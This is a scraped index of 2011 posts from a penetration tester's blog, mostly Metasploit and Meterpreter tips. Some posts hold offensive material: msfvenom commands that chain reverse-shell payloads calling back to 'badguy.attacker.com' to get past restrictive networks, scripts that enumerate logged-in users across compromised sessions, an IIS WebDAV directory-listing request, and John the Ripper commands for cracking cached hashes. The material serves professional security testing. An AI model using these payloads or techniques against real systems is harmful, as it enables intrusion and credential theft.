","date":"2011-11-27","objectID":"https://malicious.link/posts/2011/2011-11-27-12-days-of-no-starch-press/:0:0","tags":null,"title":"12 Days of No Starch Press","uri":"https://malicious.link/posts/2011/2011-11-27-12-days-of-no-starch-press/"},{"categories":["metasploit","meterpreter","post modules"],"content":"Jcran recently blogged about an easy way to run a post module on all sessions: http://blog.pentestify.com/simple-framework-domain-token-scanner msf\u003e use post/windows/gather/enum_domain_tokens msf enum_domain_tokens\u003e irb framework.sessions.each do |session| run_single(\"set SESSION #{session.first}\") run_single(\"run\") sleep 1 end You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module. Thinking back to http://blog.metasploit.com/2010/03/automating-metasploit-console.html and my rapid file PSEXEC resource file, we know we can run ruby inside of resource files with the tag. Save the following as runall.rc somewhere where you’ll remember: framework.sessions.each do |session| run_single(\"set SESSION #{session.first}\") print_status(\"Running #{active_module.fullname} against session #{session.first}\") run_single(\"run\") sleep 1 end Then when you want to run a POST module against every session you have you simply do: msf\u003e use post/windows/gather/enum_domain_tokens msf enum_domain_tokens\u003e resource runall.rc [*] Running post/windows/gather/enum_domain_tokens on session 1 Update on 2011-11-06 20:05 by Rob Fuller A commenter noticed an error in the coding for cross compatibility. The following should work better across versions: framework.sessions.each_key do |session| run_single(\"set SESSION #{session}\") print_status(\"Running #{active_module.fullname} against session #{session}\") run_single(\"run\") sleep 1 end ","date":"2011-11-02","objectID":"https://malicious.link/posts/2011/2011-11-02-run-post-modules-on-all-sessions/:0:0","tags":null,"title":"Run POST Modules On All Sessions","uri":"https://malicious.link/posts/2011/2011-11-02-run-post-modules-on-all-sessions/"},{"categories":["metasploit","msfconsole"],"content":"In @carnal0wnage and my presentation at DerbyCon 2011 we talked about using SCREEN and SCRIPT to keep connections live / use them across SSH sessions, and log everything that happens. What we didn’t cover is the fact that there isn’t a time stamp for those logs. Now, Metasploit has multiple ways of creating logs: cat ~/.msf4/logs/framework.log This log automatically logs all of the error data that is great for trouble shooting when something is working, but doesn’t record what you are doing inside of msfconsole msf\u003e spool ~/myclient.log The spool command is great for logging output from anything you do in either consoles or sessions, even when you drop to a shell. My one gripe about this one is that it doesn’t log the actual command you issued. msf\u003e set ConsoleLogging true msf\u003e set LogLevel 5 msf\u003e set SessionLogging true msf\u003e set TimestampOutput true These combined essentially do the same thing as spool except that they go into different logs, but do actually log the command you issued Plenty of logging right? But none of them really ’log everything’ and time stamps are not a regular occurrence in them. Cool, but we need both. We’ve got the ’log everything’ with the Linux ‘script’ command, we just need a way to inject time stamps into our log. Enter the ever mutable ‘msf\u003e’ prompt: A lesser known variable in MSFConsole is ‘PROMPT’. You can set this pretty much like any other OS can, however there are some metasploit specific things you can add. Using a three letter abbreviation you can even add color to it. For example lets add our hostname to our prompt: msf\u003e set PROMPT %H changes msf\u003e to myhostname\u003e And you can combine and add things that you wish: set PROMPT %H Just more text %U changes the prompt to: myattackmachine Just more text mubix\u003e (%U is username) For reference here are the other working % variables that I know of: %D = Current local directory (not sure if this changes when in meterpreter or not for the victims dir, that would be cool) %H = Host name (again, would be cool if this changed when in meterpreter) %J = Current number of jobs running %L = Local IP (makes it easy to remember what to put in LHOST) %S = Currently number of sessions open %T = Time stamp %U = Username (yes, would be awesome if this changed in meterpreter too) Now if you wanted to add colors to that, all you would do is use something like %grn%T to make the time stamp green. You’ll have to play around with the color’s names as I don’t know them all. %red %blu %blk etc… Combine all of that with script and you’ve got something awesome. I set my PROMPT to: msf\u003e set PROMPT %T S:%S J:%J 1970-01-01 00:00:00 +0000 S:0 J:0\u003e This gives me the number of jobs and sessions and has the time stamp every time I throw a command, so in my logs I can very easily narrow down the exact time when I did or didnt’ do something. The number of sessions and jobs are just good to know items. Throw in one more trick to make the whole thing a cake walk: In your ~/.msf4 directory, if you haven’t already, create a file called ‘msfconsole.rc’. This magical file will run every time you start msfconsole (with the express exception of when you specify a resource file to run from the command line using the -r argument). Throw your ‘set PROMPT %blah %blah %blah’ in there formatted however you like, and now whenever you start msfconsole you’ll have your handy dandy timestamp. Shout out to @egyp7 for showing me this. ","date":"2011-10-09","objectID":"https://malicious.link/posts/2011/2011-10-09-msfconsole-prompt-fiddling/:0:0","tags":null,"title":"MSFConsole Prompt Fiddling","uri":"https://malicious.link/posts/2011/2011-10-09-msfconsole-prompt-fiddling/"},{"categories":["derbycon","metasploit","meterpreter","pentesting","cons","presentations"],"content":"Video: Slides: The Dirty Little Secrets They Didn’t Teach You In Pentesting Class [slideshare id=9530403] Code: https://github.com/mubix/Not-In-Pentesting-Class ","date":"2011-10-06","objectID":"https://malicious.link/posts/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/:0:0","tags":null,"title":"The Dirty Little Secrets They Didn't Teach You In Pentesting Class","uri":"https://malicious.link/posts/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/"},{"categories":["meterpreter","x64"],"content":"On Vista and above there is a Windows ‘Redirector’ (A redirector is basically a Symlink or fake directory that’s there but not in Windows) (more info here) that allows a 32bit process create a 64bit one. For anyone who has tried to run ’execute -H -c -f notepad.exe’, they know that if they are in a 32bit process, they get a 32bit notepad even if they are on a 64bit system, which is annoying. So if you don’t want to read the link above you can create a stable 64bit notepad.exe by doing the following: execute -H -c -f \"C:\\\\WINDOWS\\\\Sysnative\\\\notepad.exe\" Now you can migrate into that notepad, Metasploit/Meterpreter will handle not only the network socket switch but the upgrade to a 64bit process. Now, you should be able to dump hashes like I talked about (here). Of course you need to change the drive and windows directory to match your target (Language changes and base drive changes apply), but the rest should work as perscribed. ","date":"2011-09-28","objectID":"https://malicious.link/posts/2011/2011-09-28-create-a-64bit-process-from-a-x8632bit-one/:0:0","tags":null,"title":"Create a 64bit Process From a x86/32bit One","uri":"https://malicious.link/posts/2011/2011-09-28-create-a-64bit-process-from-a-x8632bit-one/"},{"categories":["presentations","cons"],"content":"Chris Gates (@carnal0wnage) and I will be speaking at DerbyCon next week: The Dirty Little Secrets They Didn’t Teach You In Pentesting Class “This talk is about methodologies and tools that we use or have coded that make our lives and pentest schedule a little easier, and why we do things the way we do. Of course, there will be a healthy dose of Metasploit in the mix. \" ","date":"2011-09-17","objectID":"https://malicious.link/posts/2011/2011-09-17-derbycon-approaches/:0:0","tags":null,"title":"#DerbyCon Approaches...","uri":"https://malicious.link/posts/2011/2011-09-17-derbycon-approaches/"},{"categories":["meterpreter"],"content":"Say you go for the 500+ shells on an internal test or your phishing exersice goes way better than you thought. Well you need to get your bearings quickly and going into each shell and doing a ps, then looking through the list for all the users logged in is a bit of a pain and defintely not ideal. I wrote a quick script that you can throw in the meterpreter scripts folder to aide you a bit with this: users = [] client.sys.process.each_process do |x| users \u003c\u003c x[\"user\"] end users.sort! users.uniq! users.delete_if {|x| x =~ /^NT AUTHORITY/} users.delete_if {|x| x == \"\"} loggedin = users.join(', ') print_status(loggedin) All it does is automate the process I said above, used in concert with the ‘sessions -s’ command makes life a bit easier: msf post(enum_logged_on) \u003e sessions -s loggedin [*] Running script loggedin on all sessions... [*] Session 1 (victimgatewayaddress:21638): [*] DOMAIN\\User1 [*] Session 2 (victimgatewayaddress:39900): [*] DOMAIN\\AdminUser1 [*] Session 3 (victimgatewayaddress:59395): [*] DOMAIN\\User5 [*] Session 5 (victimgatewayaddress:21639): [*] DOMAIN\\User20 [*] Session 6 (victimgatewayaddress:21640): [*] COMPUTERNAME\\Administrator, DOMAIN2\\AdminUser7 [*] Session 7 (victimgatewayaddress:39901): [*] DOMAIN\\User55 You can see from this output I probably want to start with session 2, and probably 6 as well as it seems to be on another domain and an admin to boot. The example is small but on a larger scale this can start to be much more important for time management. I’m sure there are some of you out there that realized after spending hours with another session that you had one with a DA signed into it on a different system. Just a disclaimer, this ONLY shows who is logged into the sessions you have, not remote systems. ","date":"2011-09-17","objectID":"https://malicious.link/posts/2011/2011-09-17-who-is-logged-in-a-quick-way-to-pick-your-targets/:0:0","tags":null,"title":"Who Is Logged In? A Quick Way To Pick Your Targets","uri":"https://malicious.link/posts/2011/2011-09-17-who-is-logged-in-a-quick-way-to-pick-your-targets/"},{"categories":["ssh","cli"],"content":"This doesn’t really apply to Windows users as you can just close puTTy. But for everyone else, stalled SSH Sessions suck. You are either slamming enter to get it to realize it’s been disconnected or just waiting for it to. Well, for those of us who are impatient just hit: ~. Thats right, SHIFT + the key above TAB, release, and hit the period. You may have to hit ENTER first to clear the buffer or whatever it does, but do that and it will disconnect the SSH session right away. Stupid trick, but I use it all the time (especially on shotty MiFi connections). ","date":"2011-09-15","objectID":"https://malicious.link/posts/2011/2011-09-15-disconnect-stalled-ssh-session/:0:0","tags":null,"title":"Disconnect Stalled SSH Session","uri":"https://malicious.link/posts/2011/2011-09-15-disconnect-stalled-ssh-session/"},{"categories":["cracking","john the ripper","cli"],"content":"John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John’s stdin function but I like to run rules against my lists and I didn’t see any how-tos on doing this. Here is my way: ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt This command will ls the ‘dicts’ directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I). Then it’s just your standard john arguments. ","date":"2011-09-12","objectID":"https://malicious.link/posts/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/:0:0","tags":null,"title":"Multiple Dictionaries or Wordlists Using John the Ripper","uri":"https://malicious.link/posts/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/"},{"categories":["post exploitation","command lists"],"content":"I’ve had a private list of commands that I run on Windows or Linux when I pop a shell, as I’m sure most pentesters do. It isn’t so much a thing of hoarding as much it is just jumbled notes that are ’not worth posting' Well, I made two (now 3) public google docs (anyone can edit) *don’t be a dick clause Linux/Unix/BSD Post Exploitation: https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US Windows Post Exploitation: https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US OSX Post Exploitation: https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit?hl=en_US and the newly added Obsucure Syststem’s Post Exploitation: https://docs.google.com/document/d/1CIs6O1kMR-bXAT80U6Jficsqm0yR5dKUfUQgwiIKzgc/edit and Metasploit Post Exploitation: https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit Both have filled out A LOT since I first posted them but if you have that one trick command you’d like to share or just want to copy/print the list for your own uses, thats fine too. I plan to keep these publicly editable as long as people obey the DBAD clause. If you don’t know any cool commands but happen to be a tech writer and can make it look beautiful, then great! Please do. There are tables at the bottom that I want to move everything to, or something like it, but if you can do it better… Anyways, look forward to seeing how this thing grows. ","date":"2011-09-06","objectID":"https://malicious.link/posts/2011/2011-09-06-post-exploitation-command-lists/:0:0","tags":null,"title":"Post Exploitation Command Lists","uri":"https://malicious.link/posts/2011/2011-09-06-post-exploitation-command-lists/"},{"categories":["cissp","isc2","internet"],"content":" I am way late to the game on this, but if you have a blog, a twitter handle, or even better (in this specific case) a CISSP, please support Wim Remes (@wimremes), as he has submitted to become a member of the (ISC)2 Board of Directors. On twitter use the hashtag: #wim4board Lets help the certifications, especially the one with so much corporate/gov acceptance, get better. His petition: http://blog.remes-it.be/petition.html Other supporters: http://www.liquidmatrix.org/blog/2011/08/25/put-wim-remes-on-the-isc2-board/ http://www.mckeay.net/2011/08/25/support-change-at-the-isc2/ http://www.andrewhay.ca/archives/1783 http://blog.c22.cc/2011/08/25/make-your-voice-heard-change-isc%C2%B2-for-the-good/ http://blog.security4all.be/2011/08/help-improve-cissp-community-support.html ","date":"2011-08-30","objectID":"https://malicious.link/posts/2011/2011-08-30-wim-remes-wimremes-for-isc2-board-of-directors/:0:0","tags":null,"title":"Wim Remes (@wimremes) for (ISC)2 Board of Directors","uri":"https://malicious.link/posts/2011/2011-08-30-wim-remes-wimremes-for-isc2-board-of-directors/"},{"categories":["iis"],"content":"This: http://www.securityfocus.com/bid/1756 still works (on vulnerable hosts, this is an old vuln) and is very useful: Send this: SEARCH / HTTP/1.1 Host: target Content-Type: text/xml Content-Length: 133 \u003c?xml version=\"1.0\"?\u003e \u003cg:searchrequest xmlns:g=\"DAV:\"\u003e \u003cg:sql\u003e Select \"DAV:displayname\" from scope() \u003c/g:sql\u003e \u003c/g:searchrequest\u003e And expect something like this back: ","date":"2011-08-26","objectID":"https://malicious.link/posts/2011/2011-08-26-iis-search-verb-directory-listing/:0:0","tags":null,"title":"IIS Search Verb Directory Listing","uri":"https://malicious.link/posts/2011/2011-08-26-iis-search-verb-directory-listing/"},{"categories":["lab","ruby","scripting"],"content":"Update 1: No this doesn’t need to be in memory since you control the system but it was a fun challenge Update 2: The info from the ‘adduser’ payload says ‘Create a new user and add them to local administration group’ - I’m guessing since I ran this on a DC is why I didn’t notice this but it is something to keep in mind when running this script. Update 3: Here is a powershell way of doing things from a CSV, you can do some passwords in the CSV and keep it for reference too. I think this is the best solution I’ve found to inlude mine: http://unlockpowershell.wordpress.com/2010/10/12/creating-random-users-for-a-domain/ Adding users to a domain that you create for learning, training, or just for testing things out on can be quite tedious. Most of the time I just put a few users to simulate the different ’levels’ I need for my testing. However that doesn’t really give someone you’re training much to think about, i.e. It’s really easy to identify the ‘interesting’ users when there are only a couple to pick from. I am certainly not the first one to solve this problem: http://www.petri.co.il/create_users_for_testing_purposes.htm http://blog.commandlinekungfu.com/2010/07/episode-104-fricken-users.html https://twitter.com/#!/Carlos_Perez/status/71373112494661632 These work perfectly and are all really easy. The problem for me is that with some the username is too similar and/or the passwords are the same/similar. Well, of course I had to do it in Metasploit. (No, not everything has to be in Metasploit, but in this instance it actually helps a lot and you’ll see why in a sec) Easiest way to get a bunch of random users is to download a list of names, I used this one: http://packetstormsecurity.org/files/32083/other-names.gz.html And of course you need passwords too, and there isn’t a better list than the RockYou list. Skull Security has it over here: http://www.skullsecurity.org/wiki/index.php/Passwords TL:DR; You can download the Meterpreter script here: addusers.rb Start off by importing all the names and passwords into arrays we can manipulate easier: namefile = File.new('other-names.txt', 'r') passwordfile = File.new('rockyou.txt', 'r') usercount = 5000 names = [] namefile.each_line do |line| names \u003c\u003c line.chomp end passwords = [] passwordfile.each_line do |line| passwords \u003c\u003c line.chomp end The ‘usercount’ variable will be used for out loop on how many users to create. Next, just to shake things up we create another array of common suffixes: datesnum = [] (0..9).each do |x| datesnum \u003c\u003c x end (40..99).each do |x| datesnum \u003c\u003c x end (2000..2013).each do |x| datesnum \u003c\u003c x end Now to loop through the account creation, and since I’m not a big fan of running cmd.exe (staying in memory is one of the staples of Meterpreter) we’ll do it by injecting $usercount amount of the windows/adduser payload into our current process. For usernames I take a random name and use it’s first letter, and then another random selection for the rest. This makes it look like a first initial + last name username scheme. For passwords I throw a bit of twist in there I randomly select to have a ‘bad/ok/good’ password and use just a random selection, random selection + a date or number we generated earlier, or a double random selection put together, respectively. (0..usercount).each do fname = names[rand(names.size)] lname = names[rand(names.size)] goodpass = rand(3) password = case goodpass when 0 passwords[rand(passwords.size)] when 1 \"#{passwords[rand(passwords.size)]}#{datesnum[rand(datesnum.size)]}\" when 2 \"#{passwords[rand(passwords.size)]}#{passwords[rand(passwords.size)]}\" end username = \"#{fname[0].chr}#{lname}\" case goodpass when 0 puts \"#{username} has a bad password of #{password}\" when 1 puts \"#{username} has an ok password of #{password}\" when 2 puts \"#{username} has a good password of #{password}\" end payload = 'windows/adduser' pay = client.framework.payloads.create(payload) pay.datastore['USER'] = username pay.datastore['PASS'] = password raw = pay.gen","date":"2011-08-20","objectID":"https://malicious.link/posts/2011/2011-08-20-populating-your-virtual-victim-domain/:0:0","tags":null,"title":"Populating Your Virtual Victim Domain","uri":"https://malicious.link/posts/2011/2011-08-20-populating-your-virtual-victim-domain/"},{"categories":["meterpreter","railgun"],"content":"I saw a post back in June and it just recently came up again: http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/ It looked like a lot of hard work to set that up and I’m really lazy. I didn’t want to have to go through all that every time I got onto a new network. So, I made a very simple meterpreter post module to just call a Windows API key called ‘gethostbyaddr’ using Railgun. TL:DR; You can download the post module here: ipresolver.rb The function ‘gethostbyaddr’ (http://msdn.microsoft.com/en-us/library/ms738521(v=VS.85).aspx) is pretty simple at first glance: struct hostent* FAR gethostbyaddr( __in const char *addr, __in int len, __in int type ); Give it an address, length and type and it gives you a hostname back… easy right? Defining it, since it isn’t in the Railgun definitions is pretty simple: client.railgun.add_function('ws2_32', 'gethostbyaddr', 'DWORD', [ ['PCHAR', 'addr', 'in'], ['DWORD','len','in'], ['DWORD','type','in'] ]) First hurdle is to get your IP into ’network byte order’. Rex (Metasploit’s API/Library) to the rescue. http://dev.metasploit.com/documents/api/classes/Rex/Socket.html#M002073 The ‘addr_aton’ method does just that: nbi = Rex::Socket.addr_aton('192.168.1.100') =\u003e \"xC0xA8x01d\" Make the call to the API and done right? result = client.railgun.ws2_32.gethostbyaddr(nbi.to_s, nbi.size,2) Wrong, what you get back is a pointer to a mess, well lets get the mess (using a google IP for this example): struct = client.railgun.memread(result['return'],100) =\u003e \"xA0x03fx00x88x0Efx00x02x00x04x00x8Cx0Efx00x00x00x00x00x94x0Efx00x00x00x00x00J}]cqw-in-f99.1e100.netx00@efx00x06x00bx00x13x01bx00xE0vvx00xvvx00xE8x0Efx00xEEx96x03x00x00bx00x00 x01x00x00x01x00x00x00x01x00x00x00x01x00x00x00\" Ya.. that… I tried using the pointer at the 12th byte location and that worked most of the time, but failed bad on others: ptrptr = struct[12,4].unpack(\"V*\")[0] hostnameptr = client.railgun.memread(ptrptr,4).unpack(\"V*\")[0] hostname = client.railgun.memread(hostnameptr+nbi.size,59).split(\"\")[0] (there were a bunch more lines of error correcting but I’ll just wanted to show these as the actual methods used on a successful run) But on other hosts the 12th byte came back with a pointer to all 0s, so there was no way to jump again (hostnameptr) to the actual hostname. What I missed while trying to do things the “C” way was that the hostname was always pretexted with the IP address in network byte order… Hold up, I know it begins with something I already know, and ends in the standard “C” string terminator of a null byte. So all of that plus the crazy error correction became: struct = client.railgun.memread(result['return'],100) hostname = struct.split(nbi)[1].split(\"\")[0] 2 lines… work 100% of the time in my test cases. That’s it, you can check out the download for the post module above. I do however have 1 disadvantage over how the guys at SecurityArtWork did things. You can’t thread it. For whatever reason the API call that I am using uses the exact same memory space for each lookup. I tried putting threading in and what I got was a bunch of systems that resolved to the exact same thing. If anyone knows a way to fix this I am all ears because right now the module is slow. ","date":"2011-08-19","objectID":"https://malicious.link/posts/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/:0:0","tags":null,"title":"IP Resolution Using Meterpreter’s Railgun","uri":"https://malicious.link/posts/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/"},{"categories":["railgun"],"content":"One important thing to note about Railgun is that you are querying the API and just as if you were using C++ the API you are calling just might not be there on the system you are trying to call it on. So here is a quick trick to find out if a the function (API) that you are trying to call is available to you: For my example I’m using ‘getaddrinfo’ since it’s life in Windows is somewhat odd. If a user has installed Windows 2000’s IPv6 package it’s there, if not, it’s not. So if you run up on a WinNT box or a Win2k box that doesn’t have an updater stack this function isn’t going to work for you. (Just as a side note, this is not dependant on the fuction being defined in Railgun already) getaddrinfo is in ws2_32.dll (WinSock), so we get a handle from that DLL first: modhandle = client.railgun.kernel32.GetModuleHandleA('ws2_32.dll') If that returns a error in the form of a Ruby hash with “GetLastError” being ‘127’ that means that ws2_32.dll is either not there in the process. You will need to get it loaded into the process by calling client.railgun.ws2_32 or whatever DLL you are going for. (If it is not definied in Railgun this will fail and you’ll have to add the dll like I’ve talked about in previous posts) So it’s pretty eash to handle that. If modhandle[“return”] == 0 something went wrong and we need to handle it, else we got a handle address and we can continue. Next up is GetProcAddress: procaddr = client.railgun.kernel32.GetProcAddress(modhandle['return'], 'getaddrinfo') Same deal, if procaddr[“return”] == 0 then we have an issue (probably the function doesnt’ exist in that version of the DLL) else, we are good to go to call the function on the meterpreter session we are in and the system we are on. Easy stuff, doing this on any of the Railgun scripts/post modules you have will greatly increase both the reliability and the user’s ability to know why it didn’t work. ","date":"2011-08-19","objectID":"https://malicious.link/posts/2011/2011-08-19-railgun-error-checking/:0:0","tags":null,"title":"Railgun Error Checking","uri":"https://malicious.link/posts/2011/2011-08-19-railgun-error-checking/"},{"categories":["group policy","windows"],"content":"Also known as “How to practice what we preach”. I don’t know how long I’ve been telling clients that they need to have a minimum password length of 15 characters to make it so there is no chance LM will be stored (and a cursory bonus that their password won’t be close to their original). But I’ve never tried setting it myself. Well, a client called me out. You can’t! (well at least not through the UI ) TL;DR _You can edit the GptTmpl.inf file in \\\\$DOMAIN\\SYSVOL\\$DOMAIN\\Policies$\\PolicyGUID\\Machine\\Microsoft\\Windows NT\\SecEdit and set “MinimumPasswordLength” to whatever you want it to be. (You need to replace any part of the path starting with a $ with the value applicable to your domain and group policy object_) I tested this out myself, and sure enough, once you get up to 14 on the iterator, it jumps back down to 0: After some googling I came up pretty empty handed (hence the highly SEO’d title of this post). I asked the question on Twitter and got a bunch of different answers, but @RizzyRong’s was the first one in that I could try out: (THANK YOU to everyone who shot me answers, I really appreciate it, and to those who shared my curiosity I hope this helps you out) ADMod is a Joeware tool. Any windows Sys Admin should at the very least know of these tools as Penetration Testers use them to great effect: RizzyRong’s instructions are straight forward and so was the tool: For copy paste purposes thats: admod -default minpwdlength::15 w00t, done right? Lets check: We have a winner! Testing out a user: 14 characters… Cool. This applied to the Default Domain Policy. That’s a problem if I want to move this setting around or I don’t actually apply the default policy to any objects. I also ran into some file permission errors when trying to set other GPO settings after I ran ADMod: (If anyone knows a better way to operate ADMod to this end please leave a comment below) Alright, well need definitely need a cleaner and more repeatable / flexible solution. After fixing the file permission issues I noticed that in that file was my setting. I wonder if I can set this manually and have it actually stick. Lets try, we need the GUID, so lets make a policy that we can apply anywhere we want and as many times we want with JUST that minimum password length setting. GUID acquired. To make Microsoft do most of the work we need to set the minimum password length setting in that policy to 14 or whatever, just so that we don’t have to remember file and folder structure for the GPO. Next we go to the location where the policy setting is stored: \\\\$DOMAIN\\SYSVOL\\$DOMAIN\\Policies\\$PolicyGUID\\Machine\\Microsoft\\Windows NT\\SecEdit (replacing the 2 $DOMAIN instances with our domain name and $PolicyGUID with the GUID we copied from the policy page. If we set the policy to 14 there should be a line in the GptTmpl.inf file (you can open it with Notepad) that says ‘MinimumPasswordLength = 14’, change that to 15 or whatever you wish as so: We check back or simply refresh our GPO settings: Sweet, it’s there, again, just to be thorough we test and sure enough it works. A few quick notes: Your users might complain about a few popups: Not much you can do about this one, and I doubt your users will care, but this next one might get you a few support calls: I haven’t found a way to make that say anything other than 14 characters (for that matter the 24 previous passwords number is incorrect as well) If anyone knows how to fix this dialog or disable the previous one I am all ears. Please leave a comment so others can know how as well. Update on 2011-07-26 17:10 by Rob Fuller Jason mentioned that if you don’t increment the policy version in %SystemRoot\\SYSVOL\\domain\\Policies\\{PolicyGuid}\\GPT.ini then it won’t get pushed to the domain. Thanks Jason! Update on 2011-07-26 18:25 by Rob Fuller ‘cc’ commented below, but I thought this should be hilighted… “In a 2K3 domain, the password policy can only be specified in the “default domain policy” object. Policies defined else","date":"2011-07-26","objectID":"https://malicious.link/posts/2011/2011-07-26-minimum-password-length-of-15-or-more-via-gpo/:0:0","tags":null,"title":"Minimum Password Length of 15 or more via GPO","uri":"https://malicious.link/posts/2011/2011-07-26-minimum-password-length-of-15-or-more-via-gpo/"},{"categories":["metasploit","payloads"],"content":"This series was interrupted a bit by the new Metasploit HTTP/HTTPS payloads (more info). Definitely not complaining though as the new features *(as will be discussed in part 2) are some epic new additions to the payloads list. However an important change happened while the craziness over the new payloads was going on. ScriptJunkie snuck in an awesome change to msfvenom (a.k.a. msffsm). Here is the link to the ticket about the change (link) and the revision (r13057) TL;DR version: This change allows you to put multiple payloads into one binary… ya.. awesomesauce. He gives the following example: ruby msfvenom -p windows/messagebox -f raw EXITFUNC=thread \u003e /tmp/msgbox.raw ruby msfvenom -p windows/meterpreter/reverse_tcp -f raw -t /tmp/msgbox.raw -k LHOST=192.168.0.102 EXITFUNC=thread \u003e /tmp/rev102msgbox.raw ruby msfvenom -p - -f exe \u003c /tmp/rev102msgbox.raw \u003e /tmp/rev102msgbox.exe This example when ‘rev102msgbox.exe’ is run will pop up a message box with the default options (Hello, from MSF!) and throw a reverse)tcp connection to 192.168.0.102 over the default port of 4444. This is great as an example and a good way to test to see if things are working, but I don’t normally like to inform my victims that I’m there by saying hello (especially if I’m not there to see their faces). So I thought that this would be a great way of throwing a bunch of payloads together to try a few of the tried and true ways of getting past restrictive networks all in one binary. I started off with 3 payloads: reverse_tcp_dns to port 7815 reverse_tcp_dns to port 80 reverse_https to port 443 I chose those because I can change the DNS to point to a new IP address in future without having to regenerate my binary and size really isn’t a concern since I won’t be using it in an exploit. (SIDE NOTE: The motive for the port 7815 one is because sometimes there are proxy settings for port 80 and 443 which the new HTTP/HTTPS payloads can handle (‘cept for Auth proxies) but for some reason quite regularly companies will still allow odd ports to fly through unencumbered) Here is what I did: ./msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=badguy.attacker.com LPORT=443 \u003e /tmp/stage1.raw ./msfvenom -p windows/meterpreter/reverse_tcp_dns -f raw LHOST=badguy.attacker.com LPORT=80 -c /tmp/stage1.raw \u003e /tmp/stage2.raw ./msfvenom -p windows/meterpreter/reverse_tcp_dns -f exe LHOST=badguy2.attacker.com LPORT=7815 -c /tmp/stage2.raw \u003e /tmp/stage3.exe Luckily (and you’ll see why in a second) I forgot to set up a multi/handler on port 7815, which caused me to notice an issue. When one of the payloads failed to connect, ‘ExitProcess’ was called, causing all of my payloads to die prematurely (even if they had already gotten the second stage). I tried setting AutoRunScript to ‘migrate -f’ so that the payloads would migrate out into a new Notepad process. But the connection died too quickly and none of the payloads were fast enough at jumping ship. ReverseConnectRetries to the rescue. This is an advanced setting for the reverse_tcp family (ipv6_tcp, nonx_tcp, ord_tcp, tcp, tcp_allports, tcp_dns) which tells the payload how many times to loop through the initial connection. This setting defaults to 5 but can be anything between 1 and 255. The 255 setting is special since it actually sets an infinite loop. Sweet, now our sinking should never call the ExitProcess command right? Not quite, reverse_https and reverse_http doesn’t have this setting. We are still in a bit of a race condition if we want to use those payloads but it is a race we can win now at least. I wrote a very simple batch file to generate my new binary when I need it (also so I don’t have to remember all the commands): #!/bin/bash echo Building Stage 1 ./msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=badguy.attacker.com LPORT=443 \u003e /tmp/stage1.raw echo Building Stage 2 ./msfvenom -p windows/meterpreter/reverse_tcp_dns -f raw LHOST=badguy.attacker.com ReverseConnectRetries=255 LPORT=80 -c /tmp/st","date":"2011-07-17","objectID":"https://malicious.link/posts/2011/2011-07-17-metasploit-payloads-explained-part-1b/:0:0","tags":null,"title":"Metasploit Payloads Explained - Part 1b","uri":"https://malicious.link/posts/2011/2011-07-17-metasploit-payloads-explained-part-1b/"},{"categories":["cracking","gpu","rant"],"content":"I’ve been cracking passwords for a while and use a myriad of tools in a certain order to get the job done. I find that Cain is still my Go-to for allowing me to visualize the process and do some basic sorting (really wish I could search in-app). But I’ve been asking around on twitter some questions like Why is GPU cracking for 50k hashes faster than Rainbow Tables (most say the bottleneck is the HDD read style and speed) and many asked what all of my compalints are so I figured this would be the best place (vice multiple emails) DISCLAIMER: I have very little crypto knowledge and even less GPU programming knowledge so I only get to complain as a user and not as someone who can actually fix the things I complain about. Lack of LM support. I get that this is a complicated hashing algorithm, but the fact that 90% of companies still have it turned on and cracking any more than a few with Rainbow Tables is impractical unless you have a SSD raid with a GPU based cracker ($$$$$). Lack of dictionary support. Right now the best way to crack passwords is with oclhashcat-plus since it is GPU based and supports rules, multiple hashes (hash files) and directories of hashes. However, it has a very limited list of hashes it supports (No LM, SHA1, etc..) and it doesn’t support dump formats, so you need to strip the file so it just has the hash (this is more of just a bother than a gripe). I say ‘The best way’ because anything that has a key space larger than upper-alpha-numeric-32symbol (LM) is just a bit nuts to try and brute force out of the gate unless your goal is to ‘crack them all’. Me as a pentester, I want to get as many as possible, as quick as possible, so this means dictionaries are the smarter option. (Maybe later I can do the straight brute if I really need / want to) Lack of POT. For some reason every cracking app on the planet, save for JtR, thinks it’s a good idea to crack the same hash multiple times. I wish even Cain would keep a secret store of all the hashes it’s cracked stripped of anything unimportant (need the salt (username) sometimes) and store it in the background so that if it comes across the same hash it can say “oo oo I know this one” and auto populate it even before I start cracking. Why more cracking software writers don’t do this I’ll never know (would make their software seem a ton faster the more it is used) Lack of formatting documentation (#ripshairout). Rare is the time I’ve found a cracking program that shows you how it wants to consume a hash. JtR is the most egregious offenders of this but they all do it. One would think people would try and make it easy for people to use their software (give examples of what shit is supposed to look like at least if you don’t support standard formats) Those are my biggest gripes that the moment. If I am wrong on any account, let me know, I would love to know of a better way to do things. ","date":"2011-07-13","objectID":"https://malicious.link/posts/2011/2011-07-13-gpu-cracking-complaints/:0:0","tags":null,"title":"GPU Cracking Complaints","uri":"https://malicious.link/posts/2011/2011-07-13-gpu-cracking-complaints/"},{"categories":["novahackers"],"content":"I missed the 3 year anniversary of NoVA Hackers but I did want to make a post about it since we are still going strong and are now at ~150 active members. Chris Gates and I started this thing together back in October of 2008 which spawned off of Chris’ idea to start a AHA (Austin Hackers Association)-like group in NoVA. It’s ideals merged with the already going NoVA Security Luncheons that I was throwing in Reston VA and DC was where it all started. The only rule we have is participation, and mutal respect. We wanted to have a place where people could 